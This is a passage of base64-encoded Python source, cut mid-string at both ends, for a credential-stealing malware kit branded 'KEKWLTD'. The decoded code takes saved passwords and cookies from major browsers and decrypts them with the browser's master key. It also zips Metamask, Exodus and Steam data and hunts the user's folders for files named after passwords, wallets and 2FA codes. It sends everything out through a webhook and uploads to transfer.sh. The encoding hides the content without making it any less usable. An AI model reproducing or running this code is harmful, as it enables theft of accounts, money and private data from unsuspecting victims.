Y29va2llcyIgaW4gbmFtZToKICAgICAgICByYiA9ICcgfCAnLmpvaW4oZGEgZm9yIGRhIGluIGNvb2tpV29yZHMpCiAgICAgICAgaWYgbGVuKHJiKSA+IDEwMDA6CiAgICAgICAgICAgIHJycnJyID0gUmVmb3JtYXQoc3RyKGNvb2tpV29yZHMpKQogICAgICAgICAgICByYiA9ICcgfCAnLmpvaW4oZGEgZm9yIGRhIGluIHJycnJyKQoKICAgICAgICBkYXRhID0gewogICAgICAgICJjb250ZW50IjogJycsCiAgICAgICAgImVtYmVkcyI6IFsKICAgICAgICAgICAgewogICAgICAgICAgICAiZmllbGRzIjogWwogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgIm5hbWUiOiAiQ29va2llcyBGb3VuZDoiLAogICAgICAgICAgICAgICAgInZhbHVlIjogcmIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgXSwKICAgICAgICAgICAgImF1dGhvciI6IHsKICAgICAgICAgICAgICAgICduYW1lJzogZidLRUtXTFREIHYyLjMnLAogICAgICAgICAgICAgICAgJ3VybCc6ICdodHRwczovL2tla3dsdGQucnUnLAogICAgICAgICAgICAgICAgJ2ljb25fdXJsJzogJ2h0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F2YXRhcnMvMjI4NTQ5MTEzNTgxNTM1MjM1LzQzMGY4MWVhZDY3ZWFmZmNhZmZiYjZlN2IwYWYyOTI3LnBuZycKICAgICAgICAgICAgfSwKICAgICAgICAgICAgImZvb3RlciI6IHsKICAgICAgICAgICAgICAgICJ0ZXh0IjogImtla3dsdGQucnUiLAogICAgICAgICAgICB9LAogICAgICAgICAgICAnY29sb3InOiAzNzQyNzYsCiAgICAgICAgICAgIH0KICAgICAgICBdLAogICAgICAgICAiYXZhdGFyX3VybCI6ICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdmF0YXJzLzIyODU0OTExMzU4MTUzNTIzNS80MzBmODFlYWQ2N2VhZmZjYWZmYmI2ZTdiMGFmMjkyNy5wbmciLAogICAgICAgICJhdHRhY2htZW50cyI6IFtdCiAgICAgICAgfQogICAgICAgIExvYWRVcmxpYihob29rLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpCgogICAgTG9hZFJlcXVlc3RzKCJQT1NUIiwgaG9vaywgZmlsZXM9ZmlsZXMpCgpkZWYgd3JpdGVmb3JmaWxlKGRhdGEsIG5hbWUpOgogICAgcGF0aCA9IG9zLmdldGVudigiVEVNUCIpICsgZiJce25hbWV9LnR4dCIKICAgIHdpdGggb3BlbihwYXRoLCBtb2RlPSd3JywgZW5jb2Rpbmc9J3V0Zi04JykgYXMgZjoKICAgICAgICBmLndyaXRlKGYiS0VLV0xURCB8IGh0dHBzOi8va2Vrd2x0ZC5ydVxuXG4iKQogICAgICAgIGZvciBsaW5lIGluIGRhdGE6CiAgICAgICAgICAgIGlmIGxpbmVbMF0gIT0gJyc6CiAgICAgICAgICAgICAgICBmLndyaXRlKGYie2xpbmV9XG4iKQoKCgpQYXNzdyA9IFtdCmRlZiBnZXRQYXNzdyhwYXRoLCBhcmcpOgogICAgZ2xvYmFsIFBhc3N3CiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aCk6IHJldHVybgoKICAgIHBhdGhDID0gcGF0aCArIGFyZyArICIvTG9naW4gRGF0YSIKICAgIGlmIG9zLnN0YXQocGF0aEMpLnN0X3NpemUgPT0gMDogcmV0dXJuCgogICAgdGVtcGZvbGQgPSB0ZW1wICsgImtla3dsdGQiICsgJycuam9pbihyYW5kb20uY2hvaWNlKCdiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6JykgZm9yIGkgaW4gcmFuZ2UoOCkpICsgIi5kYiIKICAgIHNodXRpbC5jb3B5MihwYXRoQywgdGVtcGZvbGQpCiAgICBjb25uID0gY29ubmVjdCh0ZW1wZm9sZCkKICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkKICAgIGN1cnNvci5leGVjdXRlKCJTRUxFQ1QgYWN0aW9uX3VybCwgdXNlcm5hbWVfdmFsdWUsIHBhc3N3b3JkX3ZhbHVlIEZST00gbG9naW5zOyIpCiAgICBkYXRhID0gY3Vyc29yLmZldGNoYWxsKCkKICAgIGN1cnNvci5jbG9zZSgpCiAgICBjb25uLmNsb3NlKCkKICAgIG9zLnJlbW92ZSh0ZW1wZm9sZCkKCiAgICBwYXRoS2V5ID0gcGF0aCArICIvTG9jYWwgU3RhdGUiCiAgICB3aXRoIG9wZW4ocGF0aEtleSwgJ3InLCBlbmNvZGluZz0ndXRmLTgnKSBhcyBmOiBsb2NhbF9zdGF0ZSA9IGxvYWRzKGYucmVhZCgpKQogICAgbWFzdGVyX2tleSA9IGI2NGRlY29kZShsb2NhbF9zdGF0ZVsnb3NfY3J5cHQnXVsnZW5jcnlwdGVkX2tleSddKQogICAgbWFzdGVyX2tleSA9IENyeXB0VW5wcm90ZWN0RGF0YShtYXN0ZXJfa2V5WzU6XSkKCiAgICBmb3Igcm93IGluIGRhdGE6CiAgICAgICAgaWYgcm93WzBdICE9ICcnOgogICAgICAgICAgICBmb3Igd2EgaW4ga2V5d29yZDoKICAgICAgICAgICAgICAgIG9sZCA9IHdhCiAgICAgICAgICAgICAgICBpZiAiaHR0cHMiIGluIHdhOgogICAgICAgICAgICAgICAgICAgIHRtcCA9IHdhCiAgICAgICAgICAgICAgICAgICAgd2EgPSB0bXAuc3BsaXQoJ1snKVsxXS5zcGxpdCgnXScpWzBdCiAgICAgICAgICAgICAgICBpZiB3YSBpbiByb3dbMF06CiAgICAgICAgICAgICAgICAgICAgaWYgbm90IG9sZCBpbiBwYXN3V29yZHM6IHBhc3dXb3Jkcy5hcHBlbmQob2xkKQogICAgICAgICAgICBQYXNzdy5hcHBlbmQoZiJVUkw6IHtyb3dbMF19IFxuIElEOiB7cm93WzFdfSBcbiBQQVNTVzBSRDoge0RlY3J5cHRWYWx1ZShyb3dbMl0sIG1hc3Rlcl9rZXkpfVxuXG4iKQogICAgd3JpdGVmb3JmaWxlKFBhc3N3LCAnYmNfYWxscGFzc3dvcmRzJykKCkNvb2tpZXMgPSBbXQpkZWYgZ2V0Q29va2llKHBhdGgsIGFyZyk6CiAgICBnbG9iYWwgQ29va2llcwogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOiByZXR1cm4KCiAgICBwYXRoQyA9IHBhdGggKyBhcmcgKyAiL0Nvb2tpZXMiCiAgICBpZiBvcy5zdGF0KHBhdGhDKS5zdF9zaXplID09IDA6IHJldHVybgoKICAgIHRlbXBmb2xkID0gdGVtcCArICJrZWt3bHRkIiArICcnLmpvaW4ocmFuZG9tLmNob2ljZSgnYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5eicpIGZvciBpIGluIHJhbmdlKDgpKSArICIuZGIiCgogICAgc2h1dGlsLmNvcHkyKHBhdGhDLCB0ZW1wZm9sZCkKICAgIGNvbm4gPSBjb25uZWN0KHRlbXBmb2xkKQogICAgY3Vyc29yID0gY29ubi5jdXJzb3IoKQogICAgY3Vyc29yLmV4ZWN1dGUoIlNFTEVDVCBob3N0X2tleSwgbmFtZSwgZW5jcnlwdGVkX3ZhbHVlIEZST00gY29va2llcyIpCiAgICBkYXRhID0gY3Vyc29yLmZldGNoYWxsKCkKICAgIGN1cnNvci5jbG9zZSgpCiAgICBjb25uLmNsb3NlKCkKICAgIG9zLnJlbW92ZSh0ZW1wZm9sZCkKCiAgICBwYXRoS2V5ID0gcGF0aCArICIvTG9jYWwgU3RhdGUiCgogICAgd2l0aCBvcGVuKHBhdGhLZXksICdyJywgZW5jb2Rpbmc9J3V0Zi04JykgYXMgZjogbG9jYWxfc3RhdGUgPSBsb2FkcyhmLnJlYWQoKSkKICAgIG1hc3Rlcl9rZXkgPSBiNjRkZWNvZGUobG9jYWxfc3RhdGVbJ29zX2NyeXB0J11bJ2VuY3J5cHRlZF9rZXknXSkKICAgIG1hc3Rlcl9rZXkgPSBDcnlwdFVucHJvdGVjdERhdGEobWFzdGVyX2tleVs1Ol0pCgogICAgZm9yIHJvdyBpbiBkYXRhOgogICAgICAgIGlmIHJvd1swXSAhPSAnJzoKICAgICAgICAgICAgZm9yIHdhIGluIGtleXdvcmQ6CiAgICAgICAgICAgICAgICBvbGQgPSB3YQogICAgICAgICAgICAgICAgaWYgImh0dHBzIiBpbiB3YToKICAgICAgICAgICAgICAgICAgICB0bXAgPSB3YQogICAgICAgICAgICAgICAgICAgIHdhID0gdG1wLnNwbGl0KCdbJylbMV0uc3BsaXQoJ10nKVswXQogICAgICAgICAgICAgICAgaWYgd2EgaW4gcm93WzBdOgogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBvbGQgaW4gY29va2lXb3JkczogY29va2lXb3Jkcy5hcHBlbmQob2xkKQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICBDb29raWVzLmFwcGVuZChmIntyb3dbMF19CVRSVUUiKyIJCSIrIGYiL0ZBTFNFCTI1OTc1NzM0NTYJe3Jvd1sxXX0Je0RlY3J5cHRWYWx1ZShyb3dbMl0sIG1hc3Rlcl9rZXkpfSIpCiAgICAgICAgICAgIAogICAgd3JpdGVmb3JmaWxlKENvb2tpZXMsICdiY19hbGxjb29raWVzJykKCmRlZiBjaGVja0lmUHJvY2Vzc1J1bm5pbmcocHJvY2Vzc05hbWUpOgogICAgJycnCiAgICBDaGVjayBpZiB0aGVyZSBpcyBhbnkgcnVubmluZyBwcm9jZXNzIHRoYXQgY29udGFpbnMgdGhlIGdpdmVuIG5hbWUgcHJvY2Vzc05hbWUuCiAgICAnJycKICAgICNJdGVyYXRlIG92ZXIgdGhlIGFsbCB0aGUgcnVubmluZyBwcm9jZXNzCiAgICBmb3IgcHJvYyBpbiBwc3V0aWwucHJvY2Vzc19pdGVyKCk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICAjIENoZWNrIGlmIHByb2Nlc3MgbmFtZSBjb250YWlucyB0aGUgZ2l2ZW4gbmFtZSBzdHJpbmcuCiAgICAgICAgICAgIGlmIHByb2Nlc3NOYW1lLmxvd2VyKCkgaW4gcHJvYy5uYW1lKCkubG93ZXIoKToKICAgICAgICAgICAgICAgIHJldHVybiBUcnVlCiAgICAgICAgZXhjZXB0IChwc3V0aWwuTm9TdWNoUHJvY2VzcywgcHN1dGlsLkFjY2Vzc0RlbmllZCwgcHN1dGlsLlpvbWJpZVByb2Nlc3MpOgogICAgICAgICAgICBwYXNzCiAgICByZXR1cm4gRmFsc2U7CgoKZGVmIFppcFRoaW5ncyhwYXRoLCBhcmcsIHByb2NjKToKICAgIHBhdGhDID0gcGF0aAogICAgbmFtZSA9IGFyZwogICAgaWYgImFob2xwZmRpYWxqZ2pmaG9taWhramJtZ2ppZGxjZG5vIiBpbiBhcmc6CiAgICAgICAgYnJvd3NlciA9IHBhdGguc3BsaXQoIlxcIilbNF0uc3BsaXQoIi8iKVsxXS5yZXBsYWNlKCcgJywgJycpCiAgICAgICAgbmFtZSA9IGYiRXhvZHVzX3ticm93c2VyfSIKICAgICAgICBwYXRoQyA9IHBhdGggKyBhcmcKCiAgICBpZiAibmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iIGluIGFyZzoKICAgICAgICBicm93c2VyID0gcGF0aC5zcGxpdCgiXFwiKVs0XS5zcGxpdCgiLyIpWzFdLnJlcGxhY2UoJyAnLCAnJykKICAgICAgICBuYW1lID0gZiJNZXRhbWFza197YnJvd3Nlcn0iCiAgICAgICAgcGF0aEMgPSBwYXRoICsgYXJnCgogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGhDKTogcmV0dXJuCiAgICBpZiBjaGVja0lmUHJvY2Vzc1J1bm5pbmcoJ2Nocm9tZS5leGUnKToKICAgICAgICBwcmludCgnWWVzIGEgY2hyb21lIHByb2Nlc3Mgd2FzIHJ1bm5pbmcnKQogICAgICAgIHN1YnByb2Nlc3MuUG9wZW4oZiJ0YXNra2lsbCAvaW0ge3Byb2NjfSAvdCAvZiIsIHNoZWxsPVRydWUpCiAgICBlbHNlOgogICAgICAgIC4uLgogICAgICAgIAoKICAgIGlmICJXYWxsZXQiIGluIGFyZyBvciAiTmF0aW9uc0dsb3J5IiBpbiBhcmc6CiAgICAgICAgYnJvd3NlciA9IHBhdGguc3BsaXQoIlxcIilbNF0uc3BsaXQoIi8iKVsxXS5yZXBsYWNlKCcgJywgJycpCiAgICAgICAgbmFtZSA9IGYie2Jyb3dzZXJ9IgoKICAgIGVsaWYgIlN0ZWFtIiBpbiBhcmc6CiAgICAgICAgaWYgbm90IG9zLnBhdGguaXNmaWxlKGYie3BhdGhDfS9sb2dpbnVzZXJzLnZkZiIpOiByZXR1cm4KICAgICAgICBmID0gb3BlbihmIntwYXRoQ30vbG9naW51c2Vycy52ZGYiLCAicisiLCBlbmNvZGluZz0idXRmOCIpCiAgICAgICAgZGF0YSA9IGYucmVhZGxpbmVzKCkKICAgICAgICBmb3VuZCA9IEZhbHNlCiAgICAgICAgZm9yIGwgaW4gZGF0YToKICAgICAgICAgICAgaWYgJ1JlbWVtYmVyUGFzc3dvcmQiXHRcdCIxIicgaW4gbDoKICAgICAgICAgICAgICAgIGZvdW5kID0gVHJ1ZQogICAgICAgIGlmIGZvdW5kID09IEZhbHNlOiByZXR1cm4KICAgICAgICBuYW1lID0gYXJnCgogICAgemYgPSB6aXBmaWxlLlppcEZpbGUoZiJ7cGF0aEN9L3tuYW1lfS56aXAiLCAidyIpCiAgICBwcmludCh6ZikKICAgIGZvciBmaWxlIGluIG9zLmxpc3RkaXIocGF0aEMpOgogICAgICAgIGlmIG5vdCAiLnppcCIgaW4gZmlsZTogemYud3JpdGUocGF0aEMgKyAiLyIgKyBmaWxlKQogICAgemYuY2xvc2UoKQoKICAgIHVwbG9hZChmJ3twYXRoQ30ve25hbWV9LnppcCcpCiAgICBvcy5yZW1vdmUoZiJ7cGF0aEN9L3tuYW1lfS56aXAiKQoKCmRlZiBncmFiYl9HYXRoZXJBbGwoKToKICAgICcgICAgICAgICAgICAgICAgICAgRGVmYXVsdCBQYXRoIDwgMCA+ICAgICAgICAgICAgICAgICAgICAgICAgIFByb2Nlc05hbWUgPCAxID4gICAgICAgIFRva2VuICA8IDIgPiAgICAgICAgICAgICAgUGFzc3dvcmQgPCAzID4gICAgIENvb2tpZXMgPCA0ID4gICAgICAgICAgICAgICAgICAgICAgICAgIEV4dGVudGlvbnMgPCA1ID4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJwogICAgYnJvd3NlclBhdGhzID0gWwogICAgICAgIFtmIntyb2FtaW5nfS9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBHWCBTdGFibGUiLCAgICAgICAgICAgICAgICJvcGVyYS5leGUiLCAgICAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgICAgICAgICAiLyIsICAgICAgICAgICAgIi9OZXR3b3JrIiwgICAgICAgICAgICAgIi9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICAgICAgICAgIF0sCiAgICAgICAgW2Yie3JvYW1pbmd9L09wZXJhIFNvZnR3YXJlL09wZXJhIFN0YWJsZSIsICAgICAgICAgICAgICAgICAgIm9wZXJhLmV4ZSIsICAgICIvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAgICAgICAgICIvIiwgICAgICAgICAgICAiL05ldHdvcmsiLCAgICAgICAgICAgICAiL0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgICAgICAgICAgICAgICAgICAgICAgXSwKICAgICAgICBbZiJ7cm9hbWluZ30vT3BlcmEgU29mdHdhcmUvT3BlcmEgTmVvbi9Vc2VyIERhdGEvRGVmYXVsdCIsICAib3BlcmEuZXhlIiwgICAgIi9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICAgICAgICAgIi8iLCAgICAgICAgICAgICIvTmV0d29yayIsICAgICAgICAgICAgICIvTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzL25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiAgICAgICAgICAgICAgICAgICAgICBdLAogICAgICAgIFtmIntsb2NhbH0vR29vZ2xlL0Nocm9tZS9Vc2VyIERhdGEiLCAgICAgICAgICAgICAgICAgICAgICAgICJjaHJvbWUuZXhlIiwgICAiL0RlZmF1bHQvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAiL0RlZmF1bHQiLCAgICAgIi9EZWZhdWx0L05ldHdvcmsiLCAgICAgIi9EZWZhdWx0L0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgICAgICAgICAgICAgIF0sCiAgICAgICAgW2Yie2xvY2FsfS9Hb29nbGUvQ2hyb21lIFN4Uy9Vc2VyIERhdGEiLCAgICAgICAgICAgICAgICAgICAgImNocm9tZS5leGUiLCAgICIvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICIvRGVmYXVsdCIsICAgICAiL0RlZmF1bHQvTmV0d29yayIsICAgICAiL0RlZmF1bHQvTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzL25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiAgICAgICAgICAgICAgXSwKICAgICAgICBbZiJ7bG9jYWx9L0JyYXZlU29mdHdhcmUvQnJhdmUtQnJvd3Nlci9Vc2VyIERhdGEiLCAgICAgICAgICAiYnJhdmUuZXhlIiwgICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0IiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvRGVmYXVsdC9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICBdLAogICAgICAgIFtmIntsb2NhbH0vWWFuZGV4L1lhbmRleEJyb3dzZXIvVXNlciBEYXRhIiwgICAgICAgICAgICAgICAgICJ5YW5kZXguZXhlIiwgICAiL0RlZmF1bHQvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAiL0RlZmF1bHQiLCAgICAgIi9EZWZhdWx0L05ldHdvcmsiLCAgICAgIi9Ib3VnYUJvdWdhL25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF0sCiAgICAgICAgW2Yie2xvY2FsfS9NaWNyb3NvZnQvRWRnZS9Vc2VyIERhdGEiLCAgICAgICAgICAgICAgICAgICAgICAgImVkZ2UuZXhlIiwgICAgICIvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICIvRGVmYXVsdCIsICAgICAiL0RlZmF1bHQvTmV0d29yayIsICAgICAiL0RlZmF1bHQvTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzL25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiAgICAgICAgICAgICAgXQogICAgXQoKCgogICAgUGF0aHNfemlwcGVkID0gWwogICAgICAgIFtmIntyb2FtaW5nfS9hdG9taWMvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgJyJBdG9taWMgV2FsbGV0LmV4ZSInLCAiV2FsbGV0Il0sCiAgICAgICAgW2Yie3JvYW1pbmd9L0V4b2R1cy9leG9kdXMud2FsbGV0IiwgIkV4b2R1cy5leGUiLCAiV2FsbGV0Il0sCiAgICAgICAgWyJDOlxQcm9ncmFtIEZpbGVzICh4ODYpXFN0ZWFtXGNvbmZpZyIsICJzdGVhbS5leGUiLCAiU3RlYW0iXSwKICAgICAgICBbZiJ7cm9hbWluZ30vTmF0aW9uc0dsb3J5L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICJOYXRpb25zR2xvcnkuZXhlIiwgIk5hdGlvbnNHbG9yeSJdCiAgICBdCgoKICAgIGZvciBwYXR0IGluIGJyb3dzZXJQYXRoczoKICAgICAgICBhID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9Z2V0UGFzc3csIGFyZ3M9W3BhdHRbMF0sIHBhdHRbM11dKQogICAgICAgIGEuc3RhcnQoKQogICAgICAgIFRocmVhZGxpc3QuYXBwZW5kKGEpCgogICAgdGhyZWFkX2JjY29va2llcyA9IFtdCiAgICBmb3IgcGF0dCBpbiBicm93c2VyUGF0aHM6CiAgICAgICAgYSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWdldENvb2tpZSwgYXJncz1bcGF0dFswXSwgcGF0dFs0XV0pCiAgICAgICAgYS5zdGFydCgpCiAgICAgICAgdGhyZWFkX2JjY29va2llcy5hcHBlbmQoYSkKCiAgICBmb3IgdGhyZWFkIGluIHRocmVhZF9iY2Nvb2tpZXM6IHRocmVhZC5qb2luKCkKICAgIERFVEVDVEVEID0gVHJ1c3QoQ29va2llcykKICAgIGlmIERFVEVDVEVEID09IFRydWU6IHJldHVybgoKICAgIGZvciBwYXR0IGluIGJyb3dzZXJQYXRoczoKICAgICAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1aaXBUaGluZ3MsIGFyZ3M9W3BhdHRbMF0sIHBhdHRbNV0sIHBhdHRbMV1dKS5zdGFydCgpCgogICAgZm9yIHBhdHQgaW4gUGF0aHNfemlwcGVkOgogICAgICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PVppcFRoaW5ncywgYXJncz1bcGF0dFswXSwgcGF0dFsyXSwgcGF0dFsxXV0pLnN0YXJ0KCkKCiAgICBmb3IgdGhyZWFkIGluIFRocmVhZGxpc3Q6CiAgICAgICAgdGhyZWFkLmpvaW4oKQogICAgZ2xvYmFsIHVwdGhzCiAgICB1cHRocyA9IFtdCgogICAgZm9yIGZpbGUgaW4gWyJiY19hbGxwYXNzd29yZHMudHh0IiwgImJjX2FsbGNvb2tpZXMudHh0Il06CiAgICAgICAgdXBsb2FkKG9zLmdldGVudigiVEVNUCIpICsgIlxcIiArIGZpbGUpCgoKZGVmIGJjX3VwbG9hZGFub25maWxlcyhwYXRoKToKICAgIHRyeToKCiAgICAgICAgZmlsZXMgPSB7ICJmaWxlIjogKHBhdGgsIG9wZW4ocGF0aCwgbW9kZT0ncmInKSkgfQogICAgICAgIC4uLgogICAgICAgIHVwbG9hZCA9IHJlcXVlc3RzLnBvc3QoImh0dHBzOi8vdHJhbnNmZXIuc2gvIiwgZmlsZXM9ZmlsZXMpCiAgICAgICAgdXJsID0gdXBsb2FkLnRleHQKICAgICAgICByZXR1cm4gdXJsCiAgICBleGNlcHQ6CiAgICAgICAgcmV0dXJuIEZhbHNlCgpkZWYgYmNfRm9sZGVyX2NyZWF0ZShwYXRoRiwga2V5d29yZHMpOgogICAgZ2xvYmFsIGJjX2NyZWF0ZV9maWxlcwogICAgbWF4ZmlsZXNwZXJkaXIgPSA3CiAgICBpID0gMAogICAgbGlzdE9mRmlsZSA9IG9zLmxpc3RkaXIocGF0aEYpCiAgICBmZm91bmQgPSBbXQogICAgZm9yIGZpbGUgaW4gbGlzdE9mRmlsZToKICAgICAgICBpZiBub3Qgb3MucGF0aC5pc2ZpbGUocGF0aEYgKyAiLyIgKyBmaWxlKTogcmV0dXJuCiAgICAgICAgaSArPSAxCiAgICAgICAgaWYgaSA8PSBtYXhmaWxlc3BlcmRpcjoKICAgICAgICAgICAgdXJsID0gYmNfdXBsb2FkYW5vbmZpbGVzKHBhdGhGICsgIi8iICsgZmlsZSkKICAgICAgICAgICAgZmZvdW5kLmFwcGVuZChbcGF0aEYgKyAiLyIgKyBmaWxlLCB1cmxdKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGJyZWFrCiAgICBiY19jcmVhdGVfZmlsZXMuYXBwZW5kKFsiZm9sZGVyIiwgcGF0aEYgKyAiLyIsIGZmb3VuZF0pCgpiY19jcmVhdGVfZmlsZXMgPSBbXQpkZWYgYmNfY3JlYXRlX2ZpbGUocGF0aCwga2V5d29yZHMpOgogICAgZ2xvYmFsIGJjX2NyZWF0ZV9maWxlcwogICAgZmlmb3VuZCA9IFtdCiAgICBsaXN0T2ZGaWxlID0gb3MubGlzdGRpcihwYXRoKQogICAgZm9yIGZpbGUgaW4gbGlzdE9mRmlsZToKICAgICAgICBmb3Igd29yZiBpbiBrZXl3b3JkczoKICAgICAgICAgICAgaWYgd29yZiBpbiBmaWxlLmxvd2VyKCk6CiAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmlzZmlsZShwYXRoICsgIi8iICsgZmlsZSkgYW5kICIudHh0IiBpbiBmaWxlOgogICAgICAgICAgICAgICAgICAgIGZpZm91bmQuYXBwZW5kKFtwYXRoICsgIi8iICsgZmlsZSwgYmNfdXBsb2FkYW5vbmZpbGVzKHBhdGggKyAiLyIgKyBmaWxlKV0pCiAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgIGlmIG9zLnBhdGguaXNkaXIocGF0aCArICIvIiArIGZpbGUpOgogICAgICAgICAgICAgICAgICAgIHRhcmdldCA9IHBhdGggKyAiLyIgKyBmaWxlCiAgICAgICAgICAgICAgICAgICAgYmNfRm9sZGVyX2NyZWF0ZSh0YXJnZXQsIGtleXdvcmRzKQogICAgICAgICAgICAgICAgICAgIGJyZWFrCgogICAgYmNfY3JlYXRlX2ZpbGVzLmFwcGVuZChbImZvbGRlciIsIHBhdGgsIGZpZm91bmRdKQoKZGVmIGJjX2NoZWNraW5nKCk6CiAgICB1c2VyID0gdGVtcC5zcGxpdCgiXEFwcERhdGEiKVswXQogICAgcGF0aDJzZWFyY2ggPSBbCiAgICAgICAgdXNlciArICIvRGVza3RvcCIsCiAgICAgICAgdXNlciArICIvRG93bmxvYWRzIiwKICAgICAgICB1c2VyICsgIi9Eb2N1bWVudHMiCiAgICBdCgoKCiAgICBrZXlfd29yZHNGaWxlcyA9IFsKICAgICAgICAicGFzc3ciLAogICAgICAgICJtZHAiLAogICAgICAgICJtb3RkZXBhc3NlIiwKICAgICAgICAibW90X2RlX3Bhc3NlIiwKICAgICAgICAibG9naW4iLAogICAgICAgICJzZWNyZXQiLAogICAgICAgICJhY2NvdW50IiwKICAgICAgICAiYWNvdW50IiwKICAgICAgICAicGF5cGFsIiwKICAgICAgICAiYmFucXVlIiwKICAgICAgICAibWV0YW1hc2siLAogICAgICAgICJ3YWxsZXQiLAogICAgICAgICJjcnlwdG8iLAogICAgICAgICJleG9kdXMiLAogICAgICAgICJkaXNjb3JkIiwKICAgICAgICAiMmZhIiwKICAgICAgICAiY29kZSIsCiAgICAgICAgIm1lbW8iLAogICAgICAgICJjb21wdGUiLAogICAgICAgICJ0b2tlbiIsCiAgICAgICAgImJhY2t1cCIsCiAgICAgICAgInNlZWNyZXQiCiAgICAgICAgXQoKICAgIHdpa2l0aCA9IFtdCiAgICBmb3IgcGF0dCBpbiBwYXRoMnNlYXJjaDoKICAgICAgICBiY19jaGVja2luZyA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWJjX2NyZWF0ZV9maWxlLCBhcmdzPVtwYXR0LCBrZXlfd29yZHNGaWxlc10pO2JjX2NoZWNraW5nLnN0YXJ0KCkKICAgICAgICB3aWtpdGguYXBwZW5kKGJjX2NoZWNraW5nKQogICAgcmV0dXJuIHdpa2l0aAoKCmdsb2JhbCBrZXl3b3JkLCBjb29raVdvcmRzLCBwYXN3V29yZHMKCmtleXdvcmQgPSBbCiAgICAnbWFpbCcsICdbY29pbmJhc2VdKGh0dHBzOi8vY29pbmJhc2UuY29tKScsICdbc2VsbGl4XShodHRwczovL3NlbGxpeC5pbyknLCAnW2dtYWlsXShodHRwczovL2dtYWlsLmNvbSknLCAnW3N0ZWFtXShodHRwczovL3N0ZWFtLmNvbSknLCAnW2Rpc2NvcmRdKGh0dHBzOi8vZGlzY29yZC5jb20pJywgJ1tyaW90Z2FtZXNdKGh0dHBzOi8vcmlvdGdhbWVzLmNvbSknLCAnW3lvdXR1YmVdKGh0dHBzOi8veW91dHViZS5jb20pJywgJ1tpbnN0YWdyYW1dKGh0dHBzOi8vaW5zdGFncmFtLmNvbSknLCAnW3Rpa3Rva10oaHR0cHM6Ly90aWt0b2suY29tKScsICdbdHdpdHRlcl0oaHR0cHM6Ly90d2l0dGVyLmNvbSknLCAnW2ZhY2Vib29rXShodHRwczovL2ZhY2Vib29rLmNvbSknLCAnY2FyZCcsICdbZXBpY2dhbWVzXShodHRwczovL2VwaWNnYW1lcy5jb20pJywgJ1tzcG90aWZ5XShodHRwczovL3Nwb3RpZnkuY29tKScsICdbeWFob29dKGh0dHBzOi8veWFob28uY29tKScsICdbcm9ibG94XShodHRwczovL3JvYmxveC5jb20pJywgJ1t0d2l0Y2hdKGh0dHBzOi8vdHdpdGNoLmNvbSknLCAnW21pbmVjcmFmdF0oaHR0cHM6Ly9taW5lY3JhZnQubmV0KScsICdiYW5rJywgJ1twYXlwYWxdKGh0dHBzOi8vcGF5cGFsLmNvbSknLCAnW29yaWdpbl0oaHR0cHM6Ly9vcmlnaW4uY29tKScsICdbYW1hem9uXShodHRwczovL2FtYXpvbi5jb20pJywgJ1tlYmF5XShodHRwczovL2ViYXkuY29tKScsICdbYWxpZXhwcmVzc10oaHR0cHM6Ly9hbGlleHByZXNzLmNvbSknLCAnW3BsYXlzdGF